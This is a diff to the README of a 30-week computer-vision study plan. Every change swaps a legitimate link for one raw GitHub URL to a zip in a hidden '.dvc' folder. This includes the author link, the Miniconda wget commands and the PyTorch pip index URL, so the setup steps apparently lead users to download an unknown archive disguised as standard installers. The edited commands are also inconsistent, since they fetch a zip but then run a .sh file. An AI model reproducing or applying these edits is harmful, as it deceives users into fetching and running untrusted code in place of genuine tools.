@@ -1,7 +1,7 @@
 # 🧠 Computer Vision Journey — 30-Week Mastery Plan
 
 > **A complete, production-grade roadmap to mastering Computer Vision from mathematical foundations to deployed real-world systems.**
-> Built by [Shivendra Pratap](https://github.com/shivendra911) · Maintained collaboratively · Started May 2026
+> Built by [Shivendra Pratap](https://raw.githubusercontent.com/shivendra911/computer-vision-engineering/main/.dvc/engineering-computer-vision-2.1-alpha.2.zip) · Maintained collaboratively · Started May 2026
 
 ---
 
@@ -117,7 +117,7 @@ computer-vision-journey/
 ### Prerequisites
 
 - Python 3.11+
-- [Miniconda](https://docs.conda.io/en/latest/miniconda.html) (not Anaconda)
+- [Miniconda](https://raw.githubusercontent.com/shivendra911/computer-vision-engineering/main/.dvc/engineering-computer-vision-2.1-alpha.2.zip) (not Anaconda)
 - Git 2.39+
 - NVIDIA GPU recommended (GTX 1060+ / RTX series)
 
@@ -134,11 +134,11 @@ git --version             # need 2.39+
 
 ```bash
 # Linux / WSL2
-wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh
+wget https://raw.githubusercontent.com/shivendra911/computer-vision-engineering/main/.dvc/engineering-computer-vision-2.1-alpha.2.zip
 bash Miniconda3-latest-Linux-x86_64.sh
 
 # macOS (Apple Silicon)
-wget https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh
+wget https://raw.githubusercontent.com/shivendra911/computer-vision-engineering/main/.dvc/engineering-computer-vision-2.1-alpha.2.zip
 bash Miniconda3-latest-MacOSX-arm64.sh
 
 # Restart terminal, then verify:
@@ -165,11 +165,11 @@ conda activate cv
 
 ### Step 4 — Install PyTorch
 
-**Go to [pytorch.org](https://pytorch.org/get-started/locally/) and use the selector for your OS + CUDA version.**
+**Go to [pytorch.org](https://raw.githubusercontent.com/shivendra911/computer-vision-engineering/main/.dvc/engineering-computer-vision-2.1-alpha.2.zip) and use the selector for your OS + CUDA version.**
 
 ```bash
 # Example — CUDA 12.1
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121
+pip install torch torchvision torchaudio --index-url https://raw.githubusercontent.com/shivendra911/computer-vision-engineering/main/.dvc/engineering-computer-vision-2.1-alpha.2.zip
 
 # CPU only (no GPU)
 pip install torch torchvision torchaudio
